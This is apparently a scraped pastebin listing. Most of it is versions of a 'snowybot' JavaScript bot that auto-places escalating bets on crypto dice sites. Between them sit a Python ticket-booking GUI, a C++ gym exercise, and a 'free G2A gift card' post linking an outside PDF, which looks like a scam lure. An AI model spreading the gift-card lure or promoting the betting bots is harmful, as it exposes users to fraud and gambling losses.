if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = ((Math.floor(great/tens))*tens);
}
if (great>snot){
    snot = ((Math.floor(great/tens))*tens);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1);
}
go();"
nUE7yjE9,snowybot jd,coinwalk,JavaScript,Sunday 26th of May 2024 07:04:57 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/1000).toFixed(8));
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = 144000;
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>=fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1);
}
go();"
XfQyz22V,Untitled,evelinakolenchuk,Python,Sunday 26th of May 2024 07:04:12 PM CDT,"def buy():
    W2 = Toplevel(W1)
    W2.config(width=1440, height=810)
    L2 = Label(W2, image=p19, borderwidth=0)
    L2.place(x=0, y=0, width=1440, height=810)

    def buy3():
        W5 = Toplevel(W2)
        W5.config(width=1200, height=900)
        L5 = Label(W5, image=p8, borderwidth=0)
        L5.place(x=-1, y=-1, width=1200, height=900)

        def check():
            name = entry.get()
            entry.delete(0, 'end')
            surname = entry2.get()
            entry2.delete(0, 'end')
            patronymic = entry3.get()
            entry3.delete(0, 'end')
            passport_data = entry4.get()
            entry4.delete(0, 'end')
            num_order = str(random.randint(100000, 999999))
            Tickets.append((num_order, name, surname, patronymic, passport_data, ""–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥ - –ú–æ—Å–∫–≤–∞"",
                            ""27.05.24"", ""12.35"", ""6181""))

            W8 = Toplevel(W5)
            W8.config(width=1200, height=900)
            L8 = Label(W8, image=p12, borderwidth=0)
            L8.place(x=-1, y=-1, width=1200, height=900)

            W8.grab_set()
            W8.mainloop()

        def check1(e):
            Check['image'] = p11

        def check2(e):
            Check['image'] = p10

        Check = Button(W5, image=p10, borderwidth=0, command=check)
        Check.place(x=500, y=500, width=300, height=50)
        Check.bind('<Enter>', check1)
        Check.bind('<Leave>', check2)

        def on_validate_input(char):
            if char.isalpha() or char == """":
                return True
            else:
                return False

        vcmd = W5.register(on_validate_input)
        entry = ttk.Entry(W5, validate=""key"", validatecommand=(vcmd, '%P'))
        entry.pack()
        entry.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry.place(x=400, y=300)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry2 = ttk.Entry(W5, validate=""key"", validatecommand=(vcmd, '%P'))
        entry2.pack()
        entry2.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry2.place(x=400, y=400)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry3 = ttk.Entry(W5, validate=""key"", validatecommand=(vcmd, '%P'))
        entry3.pack()

        entry3.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry3.place(x=400, y=500)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry4 = ttk.Entry(W5)
        entry4.pack()

        entry4.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry4.place(x=650, y=600)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        LABEL_1 = ttk.Label(W5, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ"").place(x=400, y=200)
        LABEL_2 = ttk.Label(W5, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–§–∞–º–∏–ª–∏—è:"").place(x=300, y=300)
        LABEL_3 = ttk.Label(W5, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–ò–º—è:"").place(x=300, y=400)
        LABEL_4 = ttk.Label(W5, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–û—Ç—á–µ—Å—Ç–≤–æ:"").place(x=300, y=500)
        LABEL_5 = ttk.Label(W5, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –ø–∞—Å–ø–æ—Ä—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:"").place(x=300,y=600)


        W5.grab_set()
        W5.mainloop()

    def buy4(e):
        Buy1['image'] = p9

    def buy5(e):
        Buy1['image'] = p8

    Buy1 = Button(W2, image=p8, borderwidth=0, command=buy3)
    Buy1.place(x=0, y=324, width=1440, height=92 )
    Buy1.bind('<Enter>', buy4)
    Buy1.bind('<Leave>', buy5)

    def buy6():
        W6 = Toplevel(W2)
        W6.config(width=1200, height=900)
        L6 = Label(W6, image=p8, borderwidth=0)
        L6.place(x=-1, y=-1, width=1200, height=900)

        def check():
            name = entry.get()
            entry.delete(0, 'end')
            surname = entry2.get()
            entry2.delete(0, 'end')
            patronymic = entry3.get()
            entry3.delete(0, 'end')
            passport_data = entry4.get()
            entry4.delete(0, 'end')
            num_order = str(random.randint(100000, 999999))
            Tickets.append((num_order, name, surname, patronymic, passport_data, ""–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥ - –ú–æ—Å–∫–≤–∞"",
                            ""29.05.24"", ""15.10"", ""7180""))
            W8 = Toplevel(W6)
            W8.config(width=1200, height=900)
            L8 = Label(W8, image=p12, borderwidth=0)
            L8.place(x=-1, y=-1, width=1200, height=900)

            W8.grab_set()
            W8.mainloop()

        def check1(e):
            Check['image'] = p11

        def check2(e):
            Check['image'] = p10

        Check = Button(W6, image=p10, borderwidth=0, command=check)
        Check.place(x=500, y=500, width=300, height=50)
        Check.bind('<Enter>', check1)
        Check.bind('<Leave>', check2)

        def on_validate_input(char):
            if char.isalpha() or char == """":
                return True
            else:
                return False

        vcmd = W6.register(on_validate_input)
        entry = ttk.Entry(W6, validate=""key"", validatecommand=(vcmd, '%P'))
        entry.pack()

        entry.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry.place(x=400, y=300)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry2 = ttk.Entry(W6, validate=""key"", validatecommand=(vcmd, '%P'))
        entry2.pack()

        entry2.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry2.place(x=400, y=400)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry3 = ttk.Entry(W6, validate=""key"", validatecommand=(vcmd, '%P'))
        entry3.pack()

        entry3.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry3.place(x=400, y=500)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry4 = ttk.Entry(W6)
        entry4.pack()

        entry4.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry4.place(x=650, y=600)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        LABEL_1 = ttk.Label(W6, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'),
                            text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ"").place(x=400, y=200)
        LABEL_2 = ttk.Label(W6, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–§–∞–º–∏–ª–∏—è:"").place(x=300,
                                                                                                                y=300)
        LABEL_3 = ttk.Label(W6, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–ò–º—è:"").place(x=300,
                                                                                                            y=400)
        LABEL_4 = ttk.Label(W6, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–û—Ç—á–µ—Å—Ç–≤–æ:"").place(x=300,
                                                                                                                 y=500)
        LABEL_5 = ttk.Label(W6, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'),
                            text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –ø–∞—Å–ø–æ—Ä—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:"").place(x=300, y=600)

        W6.grab_set()
        W6.mainloop()

    def buy7(e):
        Buy2['image'] = p16

    def buy8(e):
        Buy2['image'] = p15

    Buy2 = Button(W2, image=p15, borderwidth=0, command=buy6)
    Buy2.place(x=0, y=420, width=1440, height=92)
    Buy2.bind('<Enter>', buy7)
    Buy2.bind('<Leave>', buy8)

    def buy9():
        W7 = Toplevel(W2)
        W7.config(width=1200, height=900)
        L7 = Label(W7, image=p8, borderwidth=0)
        L7.place(x=-1, y=-1, width=1200, height=900)

        def check():
            name = entry.get()
            entry.delete(0, 'end')
            surname = entry2.get()
            entry2.delete(0, 'end')
            patronymic = entry3.get()
            entry3.delete(0, 'end')
            passport_data = entry4.get()
            entry4.delete(0, 'end')
            num_order = str(random.randint(100000, 999999))
            Tickets.append((num_order, name, surname, patronymic, passport_data, ""–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥ - –ú–æ—Å–∫–≤–∞"",
                            ""28.05.24"", ""18.24"", ""7350""))

            W8 = Toplevel(W7)
            W8.config(width=1200, height=900)
            L8 = Label(W8, image=p12, borderwidth=0)
            L8.place(x=-1, y=-1, width=1200, height=900)

            W8.grab_set()
            W8.mainloop()

        def check1(e):
            Check['image'] = p11

        def check2(e):
            Check['image'] = p10

        Check = Button(W7, image=p10, borderwidth=0, command=check)
        Check.place(x=500, y=500, width=300, height=50)
        Check.bind('<Enter>', check1)
        Check.bind('<Leave>', check2)

        def on_validate_input(char):
            if char.isalpha() or char == """":
                return True
            else:
                return False

        vcmd = W7.register(on_validate_input)
        entry = ttk.Entry(W7, validate=""key"", validatecommand=(vcmd, '%P'))
        entry.pack()

        entry.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry.place(x=400, y=300)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry2 = ttk.Entry(W7, validate=""key"", validatecommand=(vcmd, '%P'))
        entry2.pack()

        entry2.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry2.place(x=400, y=400)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        entry3 = ttk.Entry(W7, validate=""key"", validatecommand=(vcmd, '%P'))
        entry3.pack()

        entry3.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry3.place(x=400, y=500)

        entry4 = ttk.Entry(W7)
        entry4.pack()

        entry4.config(width=50)  # –®–∏—Ä–∏–Ω–∞ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞
        entry4.place(x=650, y=600)  # –ü–æ–ª–æ–∂–µ–Ω–∏–µ –æ–∫–Ω–∞ –≤–≤–æ–¥–∞ –≤ –æ–∫–Ω–µ

        LABEL_1 = ttk.Label(W7, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'),
                            text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ"").place(x=400, y=200)
        LABEL_2 = ttk.Label(W7, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–§–∞–º–∏–ª–∏—è:"").place(x=300,
                                                                                                                y=300)
        LABEL_3 = ttk.Label(W7, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–ò–º—è:"").place(x=300,
                                                                                                            y=400)
        LABEL_4 = ttk.Label(W7, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'), text=""–û—Ç—á–µ—Å—Ç–≤–æ:"").place(x=300,
                                                                                                                 y=500)
        LABEL_5 = ttk.Label(W7, anchor=ttk.CENTER, font=('Calibri light', '14', 'bold'),
                            text=""–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–∏ –ø–∞—Å–ø–æ—Ä—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:"").place(x=300, y=600)

        W7.grab_set()
        W7.mainloop()

    def buy10(e):
        Buy3['image'] = p17

    def buy11(e):
        Buy3['image'] = p18

    Buy3 = Button(W2, image=p17, borderwidth=0, command=buy9)
    Buy3.place(x=0, y=520, width=1440, height=92)
    Buy3.bind('<Enter>', buy11)
    Buy3.bind('<Leave>', buy10)

    W2.grab_set()
    W2.mainloop()


def buy1(e):
    Buy['image'] = p3


def buy2(e):
    Buy['image'] = p2


Buy = Button(W1, image=p2, borderwidth=0, command=buy)
Buy.place(x=615, y=0, width=369, height=122)
Buy.bind('<Enter>', buy1)
Buy.bind('<Leave>', buy2)"
XzhSe4Es,snowy fbtc again,coinwalk,JavaScript,Sunday 26th of May 2024 07:03:27 PM CDT,"var elderly = parseFloat(document.getElementById('balance').innerHTML);
var prefit = 0.00000001;
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = (elderly*24);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
var myseed = ""goodgoing"";
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 
 
 
function go(){
great = document.getElementById('balance').innerHTML;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
var xol = getR(1,3);
if (xol==1) {
myseed = makeid(5);
}
if (xol==2) {
myseed = makeid(7);
}
if (xol==3) {
myseed = makeid(9);
}
document.getElementById('next_client_seed').value = myseed;
document.getElementById('double_your_btc_win_chance').value = 47.50
parseFloat(document.getElementById('double_your_btc_stake').value = ((beast*1).toFixed(8)));
parseFloat(document.getElementById('win_amount').value = ((beast*1).toFixed(8)));
document.getElementById('double_your_btc_bet_lo_button').click();
setTimeout(() => go(), 1000);
}
go();"
gLTaE1dS,ejer8tp6bis2.cpp,orlandoju,C++,Sunday 26th of May 2024 06:54:15 PM CDT,"/*
El due√±o del gimnasio Laragym nos pide que realicemos un programa que les permita cargar todas los entrenamientos de sus 50 clientes, cada registro de entrenamiento contiene:
Numero de Entrenamiento (1 - 9999999)
Cliente (101- 150)
Tipo de Entrenamiento ( 1 - 10 )
Tiempo del Entrenamiento (minutos)

Puede haber varios registros de entrenamiento por cliente. La informaci√≥n no se encuentra agrupada ni ordenada. El fin de la carga de entrenamientos se indica con un n√∫mero de entrenamiento igual a cero, informar:
1 - Por cada cliente, el tiempo total de entrenamiento (expresarlo en horas y minutos, ejemplo 70 minutos se expresar√≠a 1 hora y 10 minutos).
2 - Por cada cliente, los tipos de entrenamiento que realiz√≥.
3 - Por cada cada cliente y tipo de entrenamiento, la cantidad total de minutos entrenados. S√≥lo listar aquellos registros que sean superiores a 0.
4 - El n√∫mero de cliente que m√°s tiempo haya entrenado.
5 - Los tipos de entrenamiento que no se realizaron por ning√∫n cliente.

*/
#include <iostream>
#include <clocale>
using namespace std;

int main() {
    setlocale(LC_ALL, """");

    const int CLIENTES = 50;
    const int TIPOSENT = 10;

    int nroEntrenamiento, minutosEnt, cliente, tipoEnt;

    int tiempoTotalCliente[CLIENTES] = {};
    bool tiposEntPorCliente[CLIENTES][TIPOSENT] = {};
    int minEntPorCliente[CLIENTES][TIPOSENT] = {};
    int maxTiempoEntrenamiento, maxClienteEnt = 0;

    cout << ""Ingrese n√∫mero de entrenamiento (0 para terminar): "" << endl;
    cin >> nroEntrenamiento;

    while (nroEntrenamiento != 0) {
        cout << ""Ingrese cliente (101-150): "" << endl;
        cin >> cliente;
        cout << ""Ingrese tiempo total de entrenamiento en minutos: "" << endl;
        cin >> minutosEnt;
        cout << ""Ingrese el tipo de entrenamiento que realiz√≥ (1-10): "" << endl;
        cin >> tipoEnt;

        tiempoTotalCliente[cliente - 101] += minutosEnt;
        tiposEntPorCliente[cliente - 101][tipoEnt - 1] = true;
        minEntPorCliente[cliente - 101][tipoEnt - 1] += minutosEnt;

        if (tiempoTotalCliente[cliente - 101] > maxTiempoEntrenamiento) {
            maxTiempoEntrenamiento = tiempoTotalCliente[cliente - 101];
            maxClienteEnt = cliente;
        }
        cout<<""--------------------------------------""<<endl;
        cout << ""Ingrese n√∫mero de entrenamiento (0 para terminar): "" << endl;
        cin >> nroEntrenamiento;
    }
//1 - Por cada cliente, el tiempo total de entrenamiento (expresarlo en horas y minutos, ejemplo 70       minutos se expresar√≠a 1 hora y 10 minutos).

    cout << ""Tiempo total de entrenamiento por cliente:"" << endl;
    for (int i = 0; i < CLIENTES; i++) {
        if (tiempoTotalCliente[i] > 0) {
            int horas = tiempoTotalCliente[i] / 60;
            int minutos = tiempoTotalCliente[i] % 60;
            cout << ""Cliente "" << (i + 101) << "": "" << horas << "" horas y "" << minutos << "" minutos"" << endl;
        }
    }

//2 - Por cada cliente, los tipos de entrenamiento que realiz√≥.

    cout << ""Tipos de entrenamiento realizados por cada cliente:"" << endl;
    for (int i = 0; i < CLIENTES; i++) {
        bool tuvoTiposEnt = false;
        for (int j = 0; j < TIPOSENT; j++) {
            if (tiposEntPorCliente[i][j] == 1) {
                if (!tuvoTiposEnt) {
                    cout << ""Cliente "" << (i + 101) << "": "";
                    tuvoTiposEnt = true;
                }
                cout << (j + 1) << "" "";
            }
        }

        if (tuvoTiposEnt) {
            cout << endl;
        }
    }

    //3- Por cada cada cliente y tipo de entrenamiento, la cantidad total de minutos entrenados. S√≥lo listar aquellos registros que sean superiores a 0.
    cout << ""Minutos por tipo de entrenamiento por cliente:"" << endl;
    for (int i = 0; i < CLIENTES; i++) {
        for (int j = 0; j < TIPOSENT; j++) {
            if (minEntPorCliente[i][j] > 0) {
                cout << ""Cliente "" << (i + 101) << "", Tipo de entrenamiento "" << (j + 1) << "": "" << minEntPorCliente[i][j] << "" minutos"" << endl;
            }
        }
    }

    // 4 - El n√∫mero de cliente que m√°s tiempo haya entrenado.
    cout << ""El cliente que m√°s tiempo entren√≥ es el cliente "" << maxClienteEnt << "" con "" << maxTiempoEntrenamiento << "" minutos."" << endl;

  // 5 - Tipos de entrenamiento no realizados por ning√∫n cliente
    cout << ""Tipos de entrenamiento no realizados por ning√∫n cliente:"" << endl;
    for (int j = 0; j < TIPOSENT; j++) {
        bool realizoTipoEnt = false;
        for (int i = 0; i < CLIENTES && !realizoTipoEnt; i++) {
            if (tiposEntPorCliente[i][j] == true) {
                realizoTipoEnt = true;
            }
        }
        if (!realizoTipoEnt) {
            cout << ""Tipo de entrenamiento "" << (j + 1) << "" no fue realizado por ning√∫n cliente."" << endl;
        }
    }
    return 0;
}"
6yXCYZk6,fbtc snowybot update,coinwalk,JavaScript,Sunday 26th of May 2024 06:48:48 PM CDT,"var elderly = parseFloat(document.getElementById('balance').innerHTML);
var prefit = 0.00000001;
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = (elderly*24);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
var myseed = ""goodgoing"";
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 


function go(){
great = document.getElementById('balance').innerHTML;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
var xol = getR(1,3);
if (xol==1) {
myseed = makeid(5);
}
if (xol==2) {
myseed = makeid(7);
}
if (xol==3) {
myseed = makeid(9);
}
document.getElementById('next_client_seed').value = myseed;
document.getElementById('double_your_btc_win_chance').value = 47.50
parseFloat(document.getElementById('double_your_btc_stake').value = ((beast*1).toFixed(8)));
parseFloat(document.getElementById('win_amount').value = ((beast*1).toFixed(8)));
document.getElementById('double_your_btc_bet_lo_button').click();
setTimeout(() => go(), 1000);
}
go();"
RWAr71Cw,ü§ë G2A.com Free Gift Card Guide May 2024 FIX üéÅ,ssss50w,GetText,Sunday 26th of May 2024 06:24:15 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
27 May 2024"
T1dqymKS,fbtc snowybot,coinwalk,JavaScript,Sunday 26th of May 2024 06:18:43 PM CDT,"var elderly = parseFloat(document.getElementById('balance').innerHTML);
var prefit = Number((elderly/100).toFixed(8));
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var fours = (prefit*4);
var winnerdinner = (elderly*24);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = 0;
var great = elderly;
var snot = elderly;
var nomnom = true;
var myseed = ""goodgoing"";
 
 function getR(minz, maxz) {
  minz = Math.ceil(minz);
  maxz = Math.floor(maxz);
  return Math.floor(Math.random() * (maxz - minz + 1)) + minz;
}
 
function makeid(length) {
    var result = '';
    var cha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var chaLength = cha.length;
    for ( var ion = 0; ion < length; ion++ ){
      result += cha.charAt(Math.floor(Math.random() *
 chaLength));
   }
   return result;
} 


function go(){
great = document.getElementById('balance').innerHTML;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great<(snowie-crust)))||((great>(((Math.floor(great/tens))*tens)+sevens))&&(great<(((Math.floor(great/tens))*tens)+eights))&&(great>(snowie+crust)))){
    beast = beast*2;
    snowie = parseFloat(great);
}
if ((great<=(snot-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>snot){
    snot = parseFloat(great);
    }
if ((beast>fours)&&(great>=snot)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*3)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    snowie = 0;
    snot = parseFloat(great);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
var xol = getR(1,3);
if (xol==1) {
myseed = makeid(5);
}
if (xol==2) {
myseed = makeid(7);
}
if (xol==3) {
myseed = makeid(9);
}
document.getElementById('next_client_seed').value = myseed;
document.getElementById('double_your_btc_win_chance').value = 47.50
parseFloat(document.getElementById('double_your_btc_stake').value = ((beast*1).toFixed(8)));
parseFloat(document.getElementById('win_amount').innerHTML = ((beast*1).toFixed(8)));
document.getElementById('double_your_btc_bet_lo_button').click();
setTimeout(() => go(), 1000);
}
go();"
UijGFS9c,fbtc snowybot,coinwalk,JavaScript,Sunday 26th of May 2024 06:15:17 PM CDT,"var elderly = parseFloat(document.getElementById('balance').innerHTML);
var prefit = Number((elderly/100).toFixed(8));
var beast = prefit;
var crust = (prefit/2)
var tens = (prefit*10);
